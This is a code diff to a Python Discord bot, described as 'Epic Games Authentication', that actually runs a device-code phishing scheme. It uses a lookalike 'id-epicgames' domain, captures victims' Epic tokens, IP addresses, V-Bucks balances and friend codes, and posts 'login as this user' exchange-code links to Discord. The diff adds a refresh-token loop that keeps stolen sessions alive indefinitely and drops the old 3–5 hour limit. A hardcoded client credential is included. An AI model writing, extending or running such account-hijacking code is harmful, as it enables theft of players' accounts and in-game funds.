@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Discord Bot for Epic Games Authentication with extended 5-hour refresh sessions
-for high-value accounts.
-- Last Updated: 2025-11-20 09:30:00
+Discord Bot for Epic Games Authentication with true, indefinite session refresh
+using refresh tokens.
+- Last Updated: 2025-11-20 10:00:00
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -43,9 +43,7 @@ NGROK_DOMAIN = "help.id-epicgames.com" # Will fall back to a free URL if this fa
 
 # --- Epic Games & Timings ---
 EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
-REFRESH_INTERVAL = 180  # 3 minutes
-DEFAULT_SESSION_DURATION = 10800 # 3 hours
-HIGH_VALUE_SESSION_DURATION = 18000 # 5 hours
+REFRESH_INTERVAL = 180  # 3 minutes for refreshing the exchange code
 VBUCKS_THRESHOLD = 5000
 
 # --- Channel Name ---
@@ -210,6 +208,22 @@ async def get_exchange_code(access_token):
                 return (await r.json())['code'] if r.status == 200 else None
     except Exception: return None
 
+async def refresh_access_token(refresh_token):
+    """Uses a refresh_token to get a new set of tokens."""
+    headers = {"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
+    data = {"grant_type": "refresh_token", "refresh_token": refresh_token}
+    try:
+        async with aiohttp.ClientSession() as sess:
+            async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data=data) as r:
+                if r.status == 200:
+                    return await r.json()
+                else:
+                    logger.error(f"Failed to refresh access token, status {r.status}: {await r.text()}")
+                    return None
+    except Exception as e:
+        logger.error(f"❌ Exception while refreshing access token: {e}")
+        return None
+
 async def get_stw_codes(access_token, account_id):
     logger.info(f"[{account_id[:8]}] Fetching STW friend codes...")
     all_codes = []
@@ -297,13 +311,7 @@ def build_user_embed(session, exchange_code, is_initial):
     embed.add_field(name="🔗 Direct Login Link", value=f"**[Click to login as this user]({login_link})**", inline=False)
     embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
 
-    duration_hours = session['duration'] / 3600
-    expires_timestamp = int(session['expires_at'])
-    footer_text = f"Session ID: {session['session_id']} | Refresh #{session['refresh_count']} | Refreshes for {int(duration_hours)} hours"
-    
-    if is_high_value:
-        footer_text += " (High Value)"
-
+    footer_text = f"Session ID: {session['session_id']} | Exchange Code Refreshes: #{session['exchange_refresh_count']} | Core Token Refreshes: #{session['core_token_refresh_count']}"
     embed.set_footer(text=footer_text)
     embed.timestamp = datetime.utcnow()
     
@@ -366,35 +374,34 @@ async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
                 
                 token_resp = await r.json()
                 if "access_token" in token_resp:
-                    access_token, account_id = token_resp['access_token'], token_resp['account_id']
+                    account_id = token_resp['account_id']
                     logger.info(f"[{account_id[:8]}] ✅ USER LOGGED IN!")
                     
-                    auth_headers = {"Authorization": f"bearer {access_token}"}
+                    auth_headers = {"Authorization": f"bearer {token_resp['access_token']}"}
                     async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}", headers=auth_headers) as r3:
                         account_info = await r3.json()
                     
-                    exchange_code = await get_exchange_code(access_token)
+                    exchange_code = await get_exchange_code(token_resp['access_token'])
                     if not exchange_code: return
 
-                    stw_codes = await get_stw_codes(access_token, account_id)
-                    vbucks = await get_vbucks_balance(access_token, account_id)
-                    
-                    # Set session duration based on V-Bucks balance
-                    duration = HIGH_VALUE_SESSION_DURATION if vbucks > VBUCKS_THRESHOLD else DEFAULT_SESSION_DURATION
+                    stw_codes = await get_stw_codes(token_resp['access_token'], account_id)
+                    vbucks = await get_vbucks_balance(token_resp['access_token'], account_id)
 
                     session_id = str(uuid.uuid4())[:8]
                     with session_lock:
                         active_sessions[session_id] = {
                             'session_id': session_id,
-                            'access_token': access_token,
+                            'access_token': token_resp['access_token'],
+                            'access_token_expires_at': time.time() + token_resp['expires_in'],
+                            'refresh_token': token_resp['refresh_token'],
+                            'refresh_token_expires_at': time.time() + token_resp['refresh_expires_in'],
                             'account_info': account_info,
                             'user_ip': user_ip,
-                            'duration': duration,
-                            'expires_at': time.time() + duration,
                             'stw_codes': stw_codes,
                             'vbucks': vbucks,
                             'message_ids': {},
-                            'refresh_count': 0
+                            'exchange_refresh_count': 0,
+                            'core_token_refresh_count': 0
                         }
                     
                     asyncio.run_coroutine_threadsafe(send_or_update_embed(session_id, exchange_code, is_initial=True), bot.loop)
@@ -403,31 +410,56 @@ async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
 
 
 async def auto_refresh_session(session_id):
-    """Refreshes codes and updates the Discord message."""
+    """Refreshes tokens and updates the Discord message indefinitely."""
     with session_lock:
         session = active_sessions.get(session_id)
         if not session: return
         display_name = session['account_info'].get('displayName', 'Unknown')
         
-    logger.info(f"[{session_id}] 🔄 Auto-refresh task STARTED for {display_name}.")
-    while time.time() < session['expires_at']:
+    logger.info(f"[{session_id}] 🔄 INDEFINITE refresh task STARTED for {display_name}.")
+    
+    while True:
         await asyncio.sleep(REFRESH_INTERVAL)
         
         with session_lock:
             session = active_sessions.get(session_id)
             if not session: break
         
+        # --- Proactively refresh the core access token if it's about to expire ---
+        # Check if the access token expires in the next 10 minutes
+        if time.time() > session['access_token_expires_at'] - 600:
+            logger.info(f"[{session_id}] Core access token is expiring. Attempting to refresh...")
+            new_token_data = await refresh_access_token(session['refresh_token'])
+            
+            if new_token_data:
+                with session_lock:
+                    if session_id in active_sessions:
+                        active_sessions[session_id].update({
+                            'access_token': new_token_data['access_token'],
+                            'access_token_expires_at': time.time() + new_token_data['expires_in'],
+                            'refresh_token': new_token_data['refresh_token'],
+                            'refresh_token_expires_at': time.time() + new_token_data['refresh_expires_in'],
+                            'core_token_refresh_count': session['core_token_refresh_count'] + 1
+                        })
+                        # Update local session variable for the current loop iteration
+                        session = active_sessions[session_id]
+                logger.info(f"[{session_id}] ✅ Core access token has been successfully refreshed.")
+            else:
+                logger.error(f"[{session_id}] ❌ FATAL: Could not refresh core access token. Session will now terminate.")
+                break # Terminate the loop if the core token cannot be refreshed
+
+        # --- Refresh the short-lived exchange code ---
         new_exchange_code = await get_exchange_code(session['access_token'])
-        
         if new_exchange_code:
             with session_lock:
                 if session_id in active_sessions:
-                    active_sessions[session_id]['refresh_count'] += 1
+                    active_sessions[session_id]['exchange_refresh_count'] += 1
             
-            logger.info(f"[{session_id}] ✅ Exchange code REFRESHED for {display_name} (Refresh #{session['refresh_count']})")
+            # Log exchange code refresh separately from the more critical core token refresh
+            logger.info(f"[{session_id}] ✅ Exchange code refreshed for {display_name} (Refresh #{session['exchange_refresh_count']})")
             await send_or_update_embed(session_id, new_exchange_code)
         else:
-            logger.warning(f"[{session_id}] Exchange code refresh failed for {display_name}. Retrying.")
+            logger.warning(f"[{session_id}] Exchange code refresh failed for {display_name}. Retrying in {REFRESH_INTERVAL}s.")
 
     with session_lock: active_sessions.pop(session_id, None)
     logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}.")
